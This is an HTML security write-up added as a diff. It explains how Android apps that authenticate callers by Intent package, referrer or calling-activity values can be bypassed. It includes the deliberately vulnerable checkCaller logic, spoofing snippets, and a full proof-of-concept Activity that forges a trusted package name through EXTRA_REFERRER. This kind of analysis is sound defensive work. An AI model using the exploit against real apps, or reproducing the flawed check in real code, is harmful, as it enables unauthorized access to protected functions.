@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bypassing Insecure Activity Access Controls | 0xMon</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <nav>
+    <div class="nav-inner">
+      <a href="../index.html" class="nav-logo">0xMon</a>
+      <ul class="nav-links">
+        <li><a href="../index.html">~/writeups</a></li>
+        <li><a href="../whoami.html">~/whoami</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <article class="article">
+    <a href="../index.html" class="back-link">&larr; All writeups</a>
+
+    <p class="article-meta">Mobile &middot; 2026-09</p>
+
+    <h1>Bypassing Insecure Activity Access Controls</h1>
+
+    <h2>TL;DR</h2>
+    <p>Some developers implement security checks inside Android Activities using <code>getCallingPackage()</code>, <code>getCallingActivity()</code>, <code>Intent.getPackage()</code>, and the referrer to verify which package is calling a component that performs a sensitive action.</p>
+    <p>This is not a safe way to perform caller verification: these values do not reliably identify the application that initiated the IPC, and some of them can be supplied by the caller itself — allowing an untrusted application to impersonate an allowlisted package and bypass the check.</p>
+
+    <h2>1. Background: IPC and Caller Trust</h2>
+    <p>Android applications can communicate with each other through Inter-Process Communication (IPC), including Activities launched through Intents.</p>
+    <p>When an Activity is exported, other applications may be able to invoke it. If the Activity exposes sensitive functionality, the application needs a reliable way to determine whether the caller is authorized.</p>
+    <p>A common mistake is to treat information contained in the Intent as proof of the caller's identity.</p>
+    <p>For example, an application may retrieve a package name from the Intent, check whether that package is on an allowlist, and then verify its signing certificate.</p>
+    <p>This approach is unsafe when the package name itself can be supplied or influenced by the untrusted application making the request.</p>
+    <p>The important distinction is:</p>
+<pre><code>Package name supplied by the caller
+                !=
+Identity of the process that made the IPC request</code></pre>
+    <p>Caller-controlled metadata should therefore not be treated as an authenticated identity.</p>
+
+    <h2>2. Vulnerability Deep Dive: The Flawed Verification Logic</h2>
+    <p>A code snippet vulnerable to this type of logic is the following:</p>
+<pre><code>private String checkCaller(Intent startIntent) {
+    String packageName = null;
+
+    if (getCallingPackage() != null) {
+        packageName = getCallingPackage();
+    } else if (getCallingActivity() != null
+            &amp;&amp; getCallingActivity().getPackageName() != null) {
+        packageName = getCallingActivity().getPackageName();
+    } else if (startIntent.getPackage() != null) {
+        packageName = startIntent.getPackage();
+    } else {
+        if (getReferrer() != null &amp;&amp; getReferrer().getHost() != null) {
+            packageName = getReferrer().getHost();
+        }
+    }
+
+    // Checking if packageName is on allowlist
+    if (listOfTrustedPackages.contains(packageName)) {
+        return isPackageSecureSigned(packageName);
+    } else {
+        return false;
+    }
+}</code></pre>
+    <p>The code attempts to identify the caller using several different sources. Once a package name is obtained, the application checks whether it belongs to <code>listOfTrustedPackages</code> and then verifies its signing certificate using <code>isPackageSecureSigned()</code>.</p>
+    <p>The problem is that these sources do not all provide an authenticated caller identity.</p>
+    <p><code>getCallingPackage()</code> and <code>getCallingActivity()</code> provide caller information in specific Android invocation contexts. However, when those values are unavailable, the application falls back to <code>startIntent.getPackage()</code> and <code>getReferrer().getHost()</code>.</p>
+    <p>These values should not be considered proof of the application's identity.</p>
+    <p>An attacker can therefore reach a situation where the value stored in <code>packageName</code> comes from attacker-controlled Intent data.</p>
+    <p>The second problem is the signature validation.</p>
+    <p>If <code>isPackageSecureSigned(packageName)</code> internally performs a package lookup such as:</p>
+<pre><code>PackageManager.getPackageInfo(
+    packageName,
+    PackageManager.GET_SIGNING_CERTIFICATES
+);</code></pre>
+    <p>the application is verifying the package identified by the supplied string.</p>
+    <p>For example:</p>
+<pre><code>packageName = "com.trusted.allowlistedapp"</code></pre>
+    <p>causes the application to look up the installed package with that name and verify its certificate.</p>
+    <p>This does not prove that <code>com.trusted.allowlistedapp</code> was the application that actually initiated the IPC.</p>
+    <p>The resulting trust flow is therefore:</p>
+<pre><code>Attacker-controlled package name
+                |
+                v
+       Allowlist validation
+                |
+                v
+      Package signature lookup
+                |
+                v
+          Access granted</code></pre>
+
+    <h2>3. Exploitation Vectors and Bypass Mechanics</h2>
+    <p>There are several ways the validation logic can be reached with an attacker-controlled package name.</p>
+
+    <h3>Vector A: <code>getCallingActivity()</code> / <code>getCallingPackage()</code></h3>
+    <p>The application first checks:</p>
+<pre><code>getCallingPackage()</code></pre>
+    <p>and then:</p>
+<pre><code>getCallingActivity()</code></pre>
+    <p>These APIs are not a universal way to authenticate the application that started an Activity.</p>
+    <p>Depending on how the Activity is launched, these values may be unavailable. An attacker can therefore invoke the exported Activity through a normal <code>startActivity()</code> flow and cause the application to continue to the fallback checks.</p>
+    <p>The important point is that a <code>null</code> result does not mean that the caller is trusted. It only means that this particular caller information is not available in that context.</p>
+
+    <h3>Vector B: <code>Intent.getPackage()</code></h3>
+    <p>If the previous checks do not provide a package name, the application checks:</p>
+<pre><code>else if (startIntent.getPackage() != null) {
+    packageName = startIntent.getPackage();
+}</code></pre>
+    <p><code>Intent.getPackage()</code> identifies a package restriction used when resolving or delivering the Intent. It does not identify the application that created the Intent.</p>
+    <p>If the application treats this value as the caller's identity, it is trusting a value that belongs to the Intent rather than the IPC caller.</p>
+    <p>For example:</p>
+<pre><code>Intent intent = new Intent();
+
+intent.setPackage("com.trusted.allowlistedapp");
+
+intent.setClassName(
+    "com.victim.targetapp",
+    "com.victim.targetapp.VulnerableActivity"
+);
+
+startActivity(intent);</code></pre>
+    <p>This works because <code>getCallingPackage()</code> and <code>getCallingActivity()</code> return <code>null</code> when the Activity is launched with a plain <code>startActivity()</code> call — they are only populated when the Activity is started for a result. The validation therefore falls through to the attacker-supplied package restriction, and the explicit component does not clear it: the delivered Intent still carries the package name set via <code>setPackage()</code>.</p>
+
+    <h3>Vector C: Explicit Component and Spoofed Referrer</h3>
+    <p>Since the package restriction is attacker-controlled, Vector B is usually enough. But if the attacker wants to go through the referrer instead, the <code>getPackage()</code> check can be bypassed by targeting the vulnerable Activity with an explicit component and leaving the package restriction unset:</p>
+<pre><code>Intent intent = new Intent();
+
+ComponentName componentName = new ComponentName(
+    "com.victim.targetapp",
+    "com.victim.targetapp.VulnerableActivity"
+);
+
+intent.setComponent(componentName);</code></pre>
+    <p>With an explicit component, <code>intent.getPackage()</code> can remain <code>null</code>.</p>
+    <p>The validation code then reaches the referrer:</p>
+<pre><code>if (getReferrer() != null &amp;&amp; getReferrer().getHost() != null) {
+    packageName = getReferrer().getHost();
+}</code></pre>
+    <p>The attacker can provide a referrer containing the package name of an allowlisted application:</p>
+<pre><code>Uri fakeReferrer =
+    Uri.parse("android-app://com.trusted.allowlistedapp");
+
+intent.putExtra(Intent.EXTRA_REFERRER, fakeReferrer);
+
+startActivity(intent);</code></pre>
+    <p>The resulting flow is:</p>
+<pre><code>getCallingPackage() -&gt; unavailable
+        |
+        v
+getCallingActivity() -&gt; unavailable
+        |
+        v
+intent.getPackage() -&gt; null
+        |
+        v
+getReferrer().getHost()
+        |
+        v
+com.trusted.allowlistedapp
+        |
+        v
+Allowlist check -&gt; passed
+        |
+        v
+Signature check of installed trusted package -&gt; passed</code></pre>
+    <p>The application has now accepted a package name supplied through Intent metadata and used it as the basis for authorization.</p>
+
+    <h2>4. Proof of Concept</h2>
+    <p>The following PoC demonstrates the attack from an untrusted application:</p>
+<pre><code>package com.attacker.poc;
+
+import android.content.ComponentName;
+import android.content.Intent;
+import android.net.Uri;
+import android.os.Bundle;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+public class ExploitActivity extends AppCompatActivity {
+
+    private static final String TARGET_PKG =
+            "com.victim.targetapp";
+
+    private static final String TARGET_ACTIVITY =
+            "com.victim.targetapp.VulnerableActivity";
+
+    private static final String TRUSTED_PKG =
+            "com.trusted.allowlistedapp";
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        triggerBypass();
+    }
+
+    private void triggerBypass() {
+        Intent exploitIntent = new Intent();
+
+        // Target the vulnerable Activity directly
+        ComponentName target = new ComponentName(
+                TARGET_PKG,
+                TARGET_ACTIVITY
+        );
+
+        exploitIntent.setComponent(target);
+
+        // Provide the trusted package through the referrer
+        Uri spoofedReferrer =
+                Uri.parse("android-app://" + TRUSTED_PKG);
+
+        exploitIntent.putExtra(
+                Intent.EXTRA_REFERRER,
+                spoofedReferrer
+        );
+
+        // Launch the Activity without requesting a result
+        startActivity(exploitIntent);
+    }
+}</code></pre>
+    <p>If the vulnerable Activity is exported and the described validation logic is present, the attacker can attempt to reach the Activity while supplying the name of the trusted application through the referrer.</p>
+    <p>The expected vulnerable flow is:</p>
+<pre><code>Attacker application
+        |
+        | startActivity()
+        v
+Victim's exported Activity
+        |
+        | getCallingPackage() unavailable
+        | getCallingActivity() unavailable
+        v
+getReferrer().getHost()
+        |
+        | "com.trusted.allowlistedapp"
+        v
+Allowlist check
+        |
+        v
+Signature check
+        |
+        v
+Authorization bypass</code></pre>
+    <p>The final impact depends on what functionality is exposed by the vulnerable Activity. If the Activity performs a sensitive operation after the caller check, that operation becomes accessible to an untrusted application.</p>
+
+    <h2>5. Root Cause Analysis</h2>
+    <p>The root cause is the use of multiple Intent-related values as if they represented the authenticated identity of the caller.</p>
+    <div class="table-wrap">
+    <table>
+      <thead>
+        <tr>
+          <th>Indicator</th>
+          <th>Intended purpose</th>
+          <th>Security issue</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><code>getCallingPackage()</code></td>
+          <td>Identify the package associated with the calling context</td>
+          <td>Availability depends on how the Activity was launched</td>
+        </tr>
+        <tr>
+          <td><code>getCallingActivity()</code></td>
+          <td>Identify the calling Activity in supported invocation contexts</td>
+          <td>Not a universal caller authentication mechanism</td>
+        </tr>
+        <tr>
+          <td><code>Intent.getPackage()</code></td>
+          <td>Restrict Intent resolution to a package</td>
+          <td>Does not represent the caller</td>
+        </tr>
+        <tr>
+          <td><code>Intent.EXTRA_REFERRER</code> / <code>getReferrer()</code></td>
+          <td>Provide information about the source of an Activity launch</td>
+          <td>Should not be treated as authenticated caller identity</td>
+        </tr>
+      </tbody>
+    </table>
+    </div>
+    <p>The signature check itself is not necessarily the problem.</p>
+    <p>The problem is the value being passed to it.</p>
+    <p>If the application does this:</p>
+<pre><code>isPackageSecureSigned(packageName);</code></pre>
+    <p>and <code>packageName</code> was obtained from attacker-controlled Intent metadata, the signature check can validate a legitimate trusted application without proving that the trusted application made the request.</p>
+    <p>In other words:</p>
+<pre><code>Trusted package installed on device
+                !=
+Trusted package made this IPC request</code></pre>
+    <p>This is the core of the vulnerability.</p>
+    <p>The application should use Android-enforced access controls or another mechanism that validates the actual caller rather than trusting package names supplied through the Intent.</p>
+
+  </article>
+
+  <footer>
+    <p>0xMon // 2026</p>
+  </footer>
+
+  <script src="../js/main.js"></script>
+</body>
+</html>
